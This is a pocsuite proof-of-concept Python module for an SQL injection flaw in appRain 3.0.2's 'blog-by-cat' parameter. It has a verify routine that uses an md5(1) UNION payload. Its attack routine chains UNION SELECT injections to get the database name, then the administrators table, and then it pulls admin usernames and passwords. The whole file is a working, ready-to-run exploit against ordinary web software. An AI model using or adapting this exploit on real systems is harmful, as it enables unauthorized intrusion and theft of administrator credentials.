#!/usr/bin/env python
# coding: utf-8
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '83012'  # ssvid
    version = '1.0'
    author = ['x0day']
    vulDate = '2015-11-23'
    createDate = '2015-11-23'
    updateDate = '2015-11-23'
    references = ['http://www.sebug.net/vuldb/ssvid-83012']
    name = 'appRain 3.0.2 - Blind(or normal union query sqli) SQL Injection Vulnerability'
    appPowerLink = 'www.apprain.com'
    appName = 'appRain'
    appVersion = '3.0.2'
    vulType = 'SQL Injection'
    desc = '''this app->appRain 3.0.2 exists sql injection vulnerability,not only blind sqli,but also union query sqli vulnerability
    on the parameter "blog-by-cat" in "http://192.168.2.130/appRain-v-3.0.2/blog-by-cat/",we can exploit it like this "http://192.168.2.130/appRain-v-3.0.2/blog-by-cat/1 order by n"
    '''
    samples = ['http://192.168.2.130/appRain-v-3.0.2']



    def _attack(self):
        result = {}
        #Write your code here
        vul_url='%s/blog-by-cat' % self.url




        #to gain current_db name
        database_sqli='/-1 union select 1,2,3,4,concat(0x7e,database(),0x3a),6,7,8'
        database_url=vul_url+database_sqli
        resp=req.get(database_url)
        match_result=re.search(r'~(.*):',resp.content,re.I | re.M)
        #print resp.content
        a=match_result.group(1)
        match_result0=re.search(r'~(.*)',a,re.I | re.M)
        #print match_result0.group(1)
        current_db=match_result0.group(1)
        #got current_db name
        




        #to gain admin_table name
        db_hex=current_db.encode('hex')
        db_hex='0x'+db_hex
        #print 'db_hex is %s' % db_hex
        table_sqli='/-1 union select 1,2,3,4,group_concat(0x7e,table_name,0x3a),6,7,8 from information_schema.tables where table_schema=%s' % db_hex
        table_url=vul_url+table_sqli
        #print table_url
        resp=req.get(table_url)
        match_result0=re.search(r'~(.*administrators):',resp.content,re.I | re.M)
        a=match_result0.group(1)
        match_result1=re.search(r'>~(.*)',a,re.I | re.M)
        admin_table=match_result1.group(1)
        #print admin_table
        #got admin_table name





        #to gain key_column_value
        column_sqli='/-1 union select 1,2,3,4,group_concat(0x7e,username,0x3a,0x3a,0x3a,password,0x7e),6,7,8 from %s' % admin_table
        columns_url=vul_url+column_sqli
        #print columns_url
        response=req.get(columns_url)
        #print response.content
        if response.status_code==200:
            match_result1=re.search(r'~(.*):::(.*)~',response.content,re.I | re.M)
            a=match_result1.group(1)
            match_result2=re.search(r'(.*):::(.*)~',a,re.I | re.M)
            #print match_result2
            if match_result2:
                result['AdminInfo']={}
                result['AdminInfo']['Username']=match_result2.group(1)
                result['AdminInfo']['Password']=match_result1.group(2)
        return self.parse_output(result)




    def _verify(self):
        result = {}
        #Write your code here
        vul_url='%s/blog-by-cat' % self.url
        verify_url=vul_url+'/-1 union select 1,2,3,4,md5(1),6,7,8'
        resp=req.get(verify_url)
        if 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            result['VerifyInfo']={}
            result['VerifyInfo']['URL']=vul_url
            result['VerifyInfo']['Payload']=verify_url
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)